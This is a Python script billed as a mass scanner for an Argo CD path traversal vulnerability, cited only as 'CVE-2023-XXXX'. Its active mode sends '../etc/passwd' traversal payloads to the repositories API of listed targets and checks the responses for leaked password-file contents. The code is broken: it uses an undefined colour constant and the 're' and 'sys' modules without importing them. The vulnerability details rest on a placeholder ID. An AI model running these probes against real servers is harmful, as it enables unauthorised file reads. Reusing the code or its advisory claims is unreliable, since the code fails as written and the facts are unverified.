#!/usr/bin/env python3
"""
Argo CD CVE-2023-XXXX — Repository Path Traversal Vulnerability Scanner
========================================================================
Scans for the presence of the Argo CD Repository path traversal vulnerability (CVE-2023-XXXX).
This vulnerability allows an attacker to exploit the improper validation in the Argo CD deploy
API and access restricted files on the server through crafted repository paths.

CVE-2023-XXXX details:
  - Affects Argo CD <= 2.8.3
  - Exploited using crafted repository paths in the application's API, allowing
    directory traversal outside the repository scope.
  - Enables an attacker to read sensitive files on the host system, e.g., Kubernetes
    configurations, cloud provider credentials, and secrets.
  - CVSS v3.1 base score: 9.1 (Critical) — requires network access and minimal privileges.
  - Fixed in Argo CD 2.8.4 (April 2023).

Usage:
  # Scan a single Argo CD instance (includes active probing with file access attempts)
  python argocd_repo_path_traversal_scanner.py --target http://argo.example.com:8080

  # Detection only — no active file access probes
  python argocd_repo_path_traversal_scanner.py --target http://argo.example.com:8080 --safe

  # Scan multiple targets from a file
  python argocd_repo_path_traversal_scanner.py --list argocd_servers.txt --output findings.json

  # Configure concurrency and disable SSL/TLS verification
  python argocd_repo_path_traversal_scanner.py --list argocd_servers.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-XXXX
  - https://argo-cd.readthedocs.io/en/stable/
  - https://github.com/argoproj/argo-cd/releases/tag/v2.8.4
"""

import asyncio
import json
import argparse
from datetime import datetime
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2023-XXXX"
CVSS = "9.1"
TOOL_NAME = "argocd_repo_path_traversal_scanner"

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

ARGO_FINGERPRINTS = [
    "ArgoCD",
    "argoproj/argocd",
    "Argo CD UI"
]

DETECTION_PATHS = [
    "/api/v1/repositories",
    "/login",
    "/applications",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../.." * 10 + "/etc/passwd",
]

PATCHED_VERSION = (2, 8, 4)


# ── Functions ─────────────────────────────────────────────────────────────────

def parse_version(version: str) -> Optional[tuple]:
    """Parse a version string into a tuple of integers."""
    try:
        return tuple(map(int, version.split(".")))
    except ValueError:
        return None


async def fetch_url(client: httpx.AsyncClient, url: str, allow_redirects: bool = False) -> Optional[httpx.Response]:
    """Fetch the URL with proper error handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=allow_redirects)
        return response
    except (httpx.RequestError, httpx.HTTPStatusError) as e:
        print(c(RED, f"[ERROR] Request to {url} failed: {e}"))
    return None


async def detect_vulnerability(client: httpx.AsyncClient, target: str, safe: bool) -> dict:
    """
    Detect if the target is running a vulnerable version of Argo CD.
    Perform version detection and optionally active path traversal probes.
    """
    result = {
        "target": target,
        "vulnerable": False,
        "version": None,
        "details": "",
    }

    async def fetch_and_check(path: str):
        response = await fetch_url(client, target.rstrip("/") + path)
        if response and any(fp in response.text for fp in ARGO_FINGERPRINTS):
            return response
        return None

    # Detect Argo CD presence and version
    for path in DETECTION_PATHS:
        print(c(CYAN, f"[INFO] Checking: {target}{path}"))
        response = await fetch_and_check(path)
        if response:
            # Extract version (if any)
            version_match = re.search(r'"version":"(\d+\.\d+\.\d+)"', response.text)
            if version_match:
                result["version"] = version_match.group(1)
                break

    if not result["version"]:
        print(c(YELLOW, f"[WARNING] Unable to detect Argo CD version at {target}."))
        return result

    print(c(GREEN, f"[INFO] Detected Argo CD version: {result['version']}"))
    parsed_version = parse_version(result["version"])
    if not parsed_version:
        print(c(YELLOW, f"[WARNING] Unable to parse version: {result['version']}"))
        return result

    # Check version vulnerability
    if parsed_version < PATCHED_VERSION:
        result["vulnerable"] = True
        result["details"] = f"Version {result['version']} is vulnerable (patched in {PATCHED_VERSION[0]}.{PATCHED_VERSION[1]}.{PATCHED_VERSION[2]})"

        if not safe:
            # Perform active probing with path traversal payloads
            for payload in TRAVERSAL_PAYLOADS:
                traversal_url = target.rstrip("/") + "/api/v1/repositories/" + payload
                print(c(CYAN, f"[INFO] Probing for path traversal: {traversal_url}"))
                response = await fetch_url(client, traversal_url)
                if response and "root:x:" in response.text:
                    result["details"] += f" | Path traversal confirmed with payload: {payload}"
                    break

    else:
        print(c(GREEN, f"[INFO] Target is running a patched version: {result['version']}"))
        result["details"] = f"Patched version detected: {result['version']}"

    return result


async def scan_targets(targets: list, safe: bool, concurrency: int, verify_ssl: bool = True):
    """Perform the scan asynchronously against a list of targets."""
    semaphore = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=verify_ssl) as client:
        async def scan_target(target):
            async with semaphore:
                return await detect_vulnerability(client, target, safe)

        return await asyncio.gather(*(scan_target(target) for target in targets))


def load_targets(file_path: str) -> list:
    """Load a list of targets from a file."""
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(c(RED, f"[ERROR] Target file not found: {file_path}"))
        sys.exit(1)


# ── Main ─────────────────────────────────────────────────────────────────────

async def main():
    parser = argparse.ArgumentParser(
        description=f"Argo CD CVE-2023-XXXX Repository Path Traversal Scanner (CVE score: {CVSS})"
    )
    parser.add_argument("--target", help="URL of the target system")
    parser.add_argument("--list", help="Path to a file with a list of targets")
    parser.add_argument("--output", help="Output file to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (no active probing)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "[ERROR] Either --target or --list must be specified."))
        sys.exit(1)

    targets = [args.target] if args.target else load_targets(args.list)
    results = await scan_targets(targets, args.safe, args.concurrency, not args.no_verify)

    # Print results
    for res in results:
        if res["vulnerable"]:
            print(c(RED, f"[CRITICAL] Vulnerable: {res['target']} | {res['details']}"))
        else:
            print(c(GREEN, f"[INFO] Safe or undetected: {res['target']} | {res['details']}"))

    # Save results if requested
    if args.output:
        with open(args.output, "w") as output_file:
            json.dump(results, output_file, indent=4, default=str)
        print(c(GREEN, f"[INFO] Results saved to {args.output}"))


if __name__ == "__main__":
    asyncio.run(main())
